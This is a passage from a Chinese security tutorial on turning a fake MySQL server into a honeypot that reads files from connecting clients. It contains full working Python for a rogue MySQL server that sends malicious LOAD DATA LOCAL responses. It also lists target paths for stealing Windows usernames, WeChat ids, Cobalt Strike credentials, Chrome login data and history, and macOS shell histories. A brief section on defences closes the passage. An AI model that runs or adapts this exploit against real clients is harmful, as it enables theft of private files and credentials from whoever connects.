如果使用`Navicat`来连接的话：  
这里因为`Navicat`本身连接之后的操作要比命令行连接要多，所以这里显示失败也是正常的。可以将代码修改修改即可满足。  
在满足`Navicat`连接`mysql`的条件之后，可以知道只需要服务器端来发送一个`payload`就可以获取主机的文件了。理论上来说，可以获取的文件类型非常的多，甚至是非常敏感的文件，在这里一一学习下。
我看过非常多的`mysql`反制文章，基本上每一个师傅都顺利拿到了`微信id`等敏感信息，但是我在复现的时候发现，我没有一次是能成功的，最后发现了问题：  
我在复现的时候使用的是Navicat绿色版，打开即用，不需要安装，问题也就出在这，如果想要反制成功的话，必须一定需要安装版的Navicat！！！  
错误示范：  
# 5\. Navicat反制
## 5.1 反制条件准备
环境准备：  
`Navicat12`试用版  
攻击机：`linux`  
靶机：`Windows server 2012`、`Windows10`  
所需要的条件：正常安装版本的`Navicat`，不能使用绿色版（建议使用正版，版权意识从你我做起）  
Navicat本身不需要做任何的配置
## 5.2 获取主机名
脚本来源 ：  
在这里是为了获取`Windows`下的计算机用户名。
    C:\Windows\PFRO.log
脚本修改之后：
    # coding=utf-8
    import socket
    import os
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    port = 3306
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("", port))
    server.listen(5)
    def get_data(filename, client, addr):
        base_path = os.path.abspath('.') + "/log/" + addr[0]
        if not os.path.exists(base_path):
            os.makedirs(base_path)
        evil_response = str.encode(chr(len(filename)+1)) + b"\x00\x00\x01\xfb" + str.encode(filename)  # 恶意响应包    
        client.sendall(evil_response)
        file_data = client.recv(999999)
        print(file_data)
        with open(base_path + "/" + filename.replace("/", "_").replace(":", ""), "wb+") as f:
            f.write(file_data)
            f.close()
    while True:
        # 建立客户端连接
        client, addr = server.accept()
        print("连接地址: %s" % str(addr))
        # 返回版本信息
        version_text = b"\x4a\x00\x00\x00\x0a\x38\x2e\x30\x2e\x31\x32\x00\x08\x00\x00\x00\x2a\x51\x47\x38\x48\x17\x12\x21\x00\xff\xff\xc0\x02\x00\xff\xc3\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x7a\x6f\x6e\x25\x61\x3e\x48\x31\x25\x43\x2b\x61\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"
        client.sendall(version_text)
        try:
            # 客户端请求信息
            client.recv(9999)
        except Exception as e:
            print(e)
        # Response OK
        verification = b"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"
        client.sendall(verification)
        try:
            # SET NAMES utf8mb4
            client.recv(9999)
        except Exception as e:
            print(e)
        # Response TABULAR
        filename = "C:\\Windows\\PFRO.log"
        #这里为要读取的文件路径
        get_data(filename, client, addr)
        client.close()
然后启动蜜罐：  
配置连接信息，注意，在这里账号密码随意，毕竟`mysql`服务都是模拟的。  
在这里直接点击连接测试：  
此时看下蜜罐：  
看下`log`文件，此时获得用户名。  
## 5.3 获取微信id
在上面获取到主机用户名之后，就可以直接获取微信id，如果微信默认安装的话，在这里的路径就是：
    C:\Users\\Documents\WeChat Files\All Users\config\config.data
现在已经知道了用户名，所以文件名称为：
    C:\Users\Administrator\Documents\WeChat Files\All Users\config\config.data
在这里因为靶机上没有这个数据，所以伪造以下，试试：  
然后在靶机上连接试试，连接之后就会显示当前的微信id：
## 5.4 cobalt strike反制
在本年`hvv`中，很多师傅的`cs`被反制，其实这个反制的原理非常简单，`cobalt
strike`在启动时，用户端会默认生成一个隐藏的文件：`.aggressor.prop`，这个文件会在当前用户目录下：  
比如当前的用户是`Administrator`，那目录就是：
    C:\Users\Administrator\.aggressor.prop
`.aggressor.prop`文件里面详细记录了`cs`连接的账号、密码、端口、插件地址等。
在这里试试：  
直接运行，等结果：  
在这里获取到你的cs账号密码，反制轻松：  
## 5.5 Chrome账号和历史记录
在这里看到当前反制可以理解为一个`ssrf`了，可以下载电脑中的大部分文件，具体的有：
    chrome的login data，虽然无法解密出密码，但是还是可以获取到对方的一些账号的
    ‘C:/Users/’ + username + ‘/AppData/Local/Google/Chrome/User Data/Default/Login Data’
    chrome的历史记录
    ‘C:/Users/’ + username + ‘/AppData/Local/Google/Chrome/User Data/Default/History’
    参考：https://www.anquanke.com/post/id/215696
# 6\. 反制mac
其实`mac`也是可以反制的  
## 6.1 mac中的用户ID
在`mac`中我们通过通过读取系统日志的方式获取用户`ID`：
    /var/log/system.log
## 6.2 mac中的微信id
    /Users/{用户名}/Library/Containers/com.tencent.xinWeChat/Data/Library/Application Support/com.tencent.xinWeChat/2.0b4.0.9/topinfo.data
## 6.3 mac中的history
    /Users/{用户名}/.bash_history
    /Users/{用户名}/.zsh_history
# 7\. Windows下的mysql命令行反制
以上`mysql`连接数据库中，均是使用`Navicat`这个工具来做的，那现在进行思考：  
如果对方不适用`Navicat`，直接使用命令行能否达到反制的效果呢？  
在这里以`Windows`下的`mysql`来测试，获取的文件为`.aggressor.prop`
使用命令：
    mysql -h **.*.7*.* -u root -p
此时`mysql`显示连接成功：
在这里依旧能够获得`cs`的连接信息：  
流量：  
# 8\. 防护方法
网上有很多这样的文章，下面这个师傅写的很详细了：  
我认为最简单的方法：
  1. 使用开源数据库，比如`DBeaver`
  2. 使用`Navicat`的免安装版本（注意版权问题）
当然，现在还有一些问题，因为时间的问题，我没有细细学习，比如对于`linux`下的`mysql`命令行是否能够进行反制？  
等以后有时间的话，再做详细的探索吧，感谢各位师傅的精彩文章。